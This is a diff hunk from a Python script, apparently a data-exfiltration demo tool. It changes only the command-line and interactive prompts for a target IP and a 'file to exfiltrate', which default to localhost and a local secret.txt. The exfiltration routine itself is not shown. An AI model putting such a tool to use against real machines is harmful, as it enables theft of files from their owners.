@@ -93,10 +93,21 @@ def main() -> None:
     # Accept CLI args or prompt interactively
     if len(sys.argv) == 3:
         target_ip = sys.argv[1]
-        filepath  = sys.argv[2]
+        filepath = sys.argv[2]
     else:
-        target_ip = input("[?] Target IP   [default: 127.0.0.1] : ").strip() or "127.0.0.1"
-        filepath  = input("[?] File to exfiltrate [default: secret.txt] : ").strip() or "secret.txt"
+        target_ip = input(
+            "[?] Target IP   [default: 127.0.0.1] : "
+        ).strip() or "127.0.0.1"
+
+        default_file = os.path.join(
+            os.path.dirname(os.path.abspath(__file__)),
+            "secret.txt"
+        )
+
+        filepath = input(
+            "[?] File to exfiltrate [default: secret.txt] : "
+        ).strip() or default_file
+
         print()
 
     exfiltrate(target_ip, filepath)
